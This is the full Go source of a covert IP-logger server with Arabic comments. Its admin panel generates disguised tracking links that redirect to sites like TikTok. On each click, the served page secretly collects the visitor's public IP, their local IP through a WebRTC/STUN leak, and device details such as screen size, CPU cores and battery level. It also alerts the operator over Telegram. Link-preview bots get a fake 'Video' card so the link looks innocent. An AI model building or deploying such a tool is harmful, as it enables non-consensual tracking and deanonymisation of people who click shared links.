package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	_ "modernc.org/sqlite"
)

var db *sql.DB

// قم بتعديل هذه القيم إذا أردت تخصيص بيانات الدخول وتنبيهات تيليجرام
const (
	AdminUser   = "admin"
	AdminPass   = "admin123"
	TelegramBotToken = "" // ضع توكن بوت تيليجرام هنا إن أردت (اختياري)
	TelegramChatID   = "" // ضع معرف الشات الخاص بك هنا (اختياري)
)

type Capture struct {
	ID         int
	Code       string
	PublicIP   string
	LocalIP    string
	Port       string
	Location   string
	DeviceInfo string
	CreatedAt  string
}

type PageData struct {
	GeneratedLink string
	Captures      []Capture
}

func initDB() {
	var err error
	db, err = sql.Open("sqlite", "./secure_tracker.db")
	if err != nil {
		panic(err)
	}

	db.SetMaxOpenConns(25)
	db.SetMaxIdleConns(25)
	db.SetConnMaxLifetime(5 * time.Minute)

	createTablesSQL := `
	CREATE TABLE IF NOT EXISTS links (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		code TEXT UNIQUE,
		target_url TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);
	CREATE TABLE IF NOT EXISTS captures (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		code TEXT,
		public_ip TEXT,
		local_ip TEXT,
		port TEXT,
		location TEXT,
		device_info TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);
	CREATE INDEX IF NOT EXISTS idx_captures_code ON captures(code);
	CREATE INDEX IF NOT EXISTS idx_captures_created ON captures(created_at);
	`
	_, err = db.Exec(createTablesSQL)
	if err != nil {
		panic(err)
	}
}

func getRealIP(r *http.Request) string {
	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded != "" {
		ips := strings.Split(forwarded, ",")
		return strings.TrimSpace(ips[0])
	}
	ip := r.RemoteAddr
	if idx := strings.LastIndex(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}
	return ip
}

func getISPAndLocation(ip string, ua string) string {
	if ip == "127.0.0.1" || ip == "::1" || strings.HasPrefix(ip, "192.168.") {
		return "Local Network"
	}

	lowerUA := strings.ToLower(ua)
	if strings.Contains(lowerUA, "telegram") {
		return "Telegram Bot"
	}
	if strings.Contains(lowerUA, "whatsapp") {
		return "WhatsApp Bot"
	}
	if strings.Contains(lowerUA, "facebookexternalhit") || strings.Contains(lowerUA, "messenger") {
		return "Meta Bot"
	}

	resp, err := http.Get(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,city,isp,org", ip))
	if err != nil {
		return "Algeria (Trace)"
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var result map[string]interface{}
	json.Unmarshal(body, &result)

	if status, ok := result["status"].(string); ok && status == "success" {
		city, _ := result["city"].(string)
		country, _ := result["country"].(string)
		if country == "" {
			country = "Algeria"
		}
		isp, _ := result["isp"].(string)
		if isp == "" {
			isp, _ = result["org"].(string)
		}

		lowerISP := strings.ToLower(isp)
		networkType := fmt.Sprintf(" [%s]", isp)
		if strings.Contains(lowerISP, "mobilis") {
			networkType = " [⚡ Mobilis]"
		} else if strings.Contains(lowerISP, "djezzy") || strings.Contains(lowerISP, "ota") {
			networkType = " [🔥 Djezzy]"
		} else if strings.Contains(lowerISP, "ooredoo") || strings.Contains(lowerISP, "wataniya") {
			networkType = " [⭐ Ooredoo]"
		} else if strings.Contains(lowerISP, "algerie telecom") || strings.Contains(lowerISP, "atm") {
			networkType = " [🌐 Algérie Télécom]"
		}

		locStr := country
		if city != "" {
			locStr = city + ", " + country
		}
		return locStr + networkType
	}
	return "Algeria (Trace)"
}

func sendTelegramAlert(message string) {
	if TelegramBotToken == "" || TelegramChatID == "" {
		return
	}
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TelegramBotToken)
	resp, err := http.PostForm(apiURL, url.Values{
		"chat_id": {TelegramChatID},
		"text":    {message},
	})
	if err == nil {
		resp.Body.Close()
	}
}

func mainHandler(w http.ResponseWriter, r *http.Request) {
	code := r.URL.Query().Get("r")

	// معالجة زيارات الروابط وتتبع الأهداف
	if code != "" {
		var targetURL string
		err := db.QueryRow("SELECT target_url FROM links WHERE code = ?", code).Scan(&targetURL)
		if err != nil {
			http.Error(w, "Link not found", http.StatusNotFound)
			return
		}

		ua := r.UserAgent()
		isBot := strings.Contains(strings.ToLower(ua), "bot") ||
			strings.Contains(strings.ToLower(ua), "whatsapp") ||
			strings.Contains(strings.ToLower(ua), "telegram") ||
			strings.Contains(strings.ToLower(ua), "facebookexternalhit")

		if isBot {
			publicIP := getRealIP(r)
			location := getISPAndLocation(publicIP, ua)
			go func() {
				db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
					code, publicIP, "Bot", "N/A", location, "🤖 [Bot] UA: "+ua[:30])
			}()

			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta property="og:title" content="Video"><meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600"></head><body></body></html>`)
			return
		}

		if r.Method == http.MethodPost {
			r.ParseForm()
			publicIP := getRealIP(r)
			localIP := r.FormValue("lip")
			if localIP == "" {
				localIP = "Unknown"
			}
			port := r.RemoteAddr
			location := getISPAndLocation(publicIP, ua)

			deviceInfo := fmt.Sprintf("OS: %s | Screen: %s | Cores: %s | Battery: %s",
				r.FormValue("platform"), r.FormValue("screen"), r.FormValue("hardware"), r.FormValue("battery"))

			// تنفيذ الحفظ وإرسال التنبيه في الخلفية (Goroutine) لضمان السرعة المطلقة
			go func() {
				db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
					code, publicIP, localIP, port, location, deviceInfo)
				
				alertMsg := fmt.Sprintf("🚨 [New Capture]\nCode: %s\nIP: %s\nLocal: %s\nLoc: %s\nInfo: %s", code, publicIP, localIP, location, deviceInfo)
				sendTelegramAlert(alertMsg)
			}()

			w.WriteHeader(http.StatusOK)
			w.Write([]byte("OK"))
			return
		}

		htmlContent := fmt.Sprintf(`<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <script>
        function getLocalIP(callback) {
            let found = false;
            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                let ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                if (ipMatch) {
                    let ip = ipMatch[1];
                    if ((ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) && !found) {
                        found = true; callback(ip); pc.onicecandidate = null;
                    }
                }
            };
            setTimeout(() => { if (!found) callback("Cellular"); }, 50);
        }

        async function extractAndRedirect() {
            let screenRes = window.screen.width + "x" + window.screen.height;
            let cores = navigator.hardwareConcurrency || "N/A";
            let platform = navigator.platform || "N/A";
            let batteryInfo = "N/A";
            try {
                if (navigator.getBattery) {
                    let b = await navigator.getBattery();
                    batteryInfo = Math.round(b.level * 100) + "%%";
                }
            } catch(e){}

            getLocalIP(function(lip) {
                let params = new URLSearchParams();
                params.append('lip', lip);
                params.append('screen', screenRes);
                params.append('hardware', cores);
                params.append('battery', batteryInfo);
                params.append('platform', platform);

                navigator.sendBeacon ? navigator.sendBeacon(window.location.href, params) : fetch(window.location.href, {method: 'POST', body: params, keepalive:true});

                setTimeout(() => {
                    window.location.replace("%s");
                }, 90);
            });
        }
        window.addEventListener('DOMContentLoaded', extractAndRedirect);
    </script>
</head>
<body style="background:#000;"></body>
</html>`, targetURL)
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(htmlContent))
		return
	}

	// حماية لوحة التحكم باستخدام Basic Authentication
	user, pass, ok := r.BasicAuth()
	if !ok || user != AdminUser || pass != AdminPass {
		w.Header().Set("WWW-Authenticate`, `Basic realm=\"Restricted Terminal\"")
		http.Error(w, "Unauthorized access restricted.", http.StatusUnauthorized)
		return
	}

	var generatedLink string
	if r.Method == http.MethodPost {
		r.ParseForm()
		targetURL := r.FormValue("target_url")
		customCode := r.FormValue("custom_code")

		if targetURL != "" {
			if !strings.HasPrefix(targetURL, "http") {
				targetURL = "https://" + targetURL
			}

			codeGen := customCode
			if codeGen == "" {
				codeGen = fmt.Sprintf("%d", time.Now().UnixNano())[8:]
			}

			_, err := db.Exec("INSERT INTO links (code, target_url) VALUES (?, ?)", codeGen, targetURL)
			if err == nil {
				scheme := "https"
				if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" {
					scheme = "http"
				}
				generatedLink = fmt.Sprintf("%s://%s/?r=%s", scheme, r.Host, codeGen)
			}
		}
	}

	rows, _ := db.Query("SELECT id, code, public_ip, local_ip, port, location, device_info, created_at FROM captures ORDER BY id DESC LIMIT 50")
	defer rows.Close()

	var captures []Capture
	for rows.Next() {
		var c Capture
		rows.Scan(&c.ID, &c.Code, &c.PublicIP, &c.LocalIP, &c.Port, &c.Location, &c.DeviceInfo, &c.CreatedAt)
		captures = append(captures, c)
	}

	data := PageData{
		GeneratedLink: generatedLink,
		Captures:      captures,
	}

	tmpl := `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Terminal - Intelligence</title>
    <style>
        body { 
            background-color: #0d1117; 
            background-image: radial-gradient(rgba(0, 255, 128, 0.05) 1px, transparent 1px);
            background-size: 24px 24px;
            color: #c9d1d9; 
            font-family: 'Courier New', Courier, monospace; 
            padding: 10px; 
            margin: 0; 
        }
        .box { 
            background: #161b22; 
            border: 1px solid #30363d; 
            padding: 14px; 
            border-radius: 6px; 
            margin-bottom: 15px; 
            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
        }
        input[type="text"] { 
            width: 100%; 
            padding: 10px; 
            background: #0d1117; 
            border: 1px solid #30363d; 
            color: #58a6ff; 
            border-radius: 4px; 
            margin-bottom: 10px; 
            font-size: 13px; 
            font-family: 'Courier New', Courier, monospace;
            box-sizing: border-box; 
        }
        button { 
            background: #238636; 
            color: #fff; 
            border: none; 
            padding: 10px; 
            border-radius: 4px; 
            cursor: pointer; 
            font-weight: bold; 
            width: 100%; 
            font-size: 13px; 
            font-family: 'Courier New', Courier, monospace;
        }
        button:hover { background: #2ea043; }
        .result { 
            background: #0d1117; 
            border: 1px solid #238636; 
            padding: 10px; 
            border-radius: 4px; 
            margin-top: 10px; 
            word-break: break-all; 
        }
        .copy-btn { 
            background: #1f6feb; 
            margin-top: 8px; 
            padding: 6px; 
            font-size: 11px; 
        }
        .table-wrap { width: 100%; overflow-x: auto; -webkit-overflow-scrolling: touch; }
        table { width: 100%; min-width: 550px; border-collapse: collapse; margin-top: 8px; font-size: 11px; font-family: 'Courier New', Courier, monospace; }
        th, td { border: 1px solid #30363d; padding: 6px; text-align: center; white-space: nowrap; }
        th { background: #21262d; color: #8b949e; }
    </style>
    <script>
        function copyLink() {
            var linkText = document.getElementById("genLink").innerText;
            navigator.clipboard.writeText(linkText).then(function() {
                alert("تم نسخ الرابط البرمجي بنجاح!");
            });
        }
    </script>
</head>
<body>
    <div class="box">
        <h3 style="margin-top:0; font-size:13px; color:#58a6ff;">// [SECURE SYSTEM] - توليد رابط تتبع بررمز مخصص</h3>
        <form method="POST">
            <input type="text" name="target_url" placeholder="target_url (tiktok.com/...)" required autocomplete="off">
            <input type="text" name="custom_code" placeholder="custom_tracking_code (optional)" autocomplete="off">
            <button type="submit">generate_secure_link()</button>
        </form>
        {{if .GeneratedLink}}
        <div class="result">
            <span style="font-size:11px; color:#3fb950; font-weight:bold;">Active Secure Link:</span><br>
            <span id="genLink" style="color: #58a6ff; font-size: 12px;">{{.GeneratedLink}}</span>
            <button type="button" class="copy-btn" onclick="copyLink()">copy_to_clipboard</button>
        </div>
        {{end}}
    </div>

    <div class="box">
        <h3 style="margin-top:0; font-size:13px; color:#58a6ff;">// [DATABASE] - سجلات الاستخبارات المشفرة</h3>
        <div class="table-wrap">
            <table>
                <tr>
                    <th>ID</th>
                    <th>Code</th>
                    <th>Public IP</th>
                    <th>Local IP</th>
                    <th>ISP / Network</th>
                    <th>Hardware & OS</th>
                    <th>Timestamp</th>
                </tr>
                {{range .Captures}}
                <tr>
                    <td>{{.ID}}</td>
                    <td style="color:#58a6ff; font-weight:bold;">{{.Code}}</td>
                    <td style="color:#7ee787;">{{.PublicIP}}</td>
                    <td style="color:#d29922;">{{.LocalIP}}</td>
                    <td style="color:#3fb950;">{{.Location}}</td>
                    <td style="color:#ff7b72;">{{.DeviceInfo}}</td>
                    <td style="color:#8b949e;">{{.CreatedAt}}</td>
                </tr>
                {{end}}
            </table>
        </div>
    </div>
</body>
</html>`

	t, _ := template.New("index").Parse(tmpl)
	t.Execute(w, data)
}

func main() {
	initDB()
	http.HandleFunc("/", mainHandler)
	fmt.Println("[*] Secure Terminal Server running on port 8080...")
	http.ListenAndServe(":8080", nil)
}
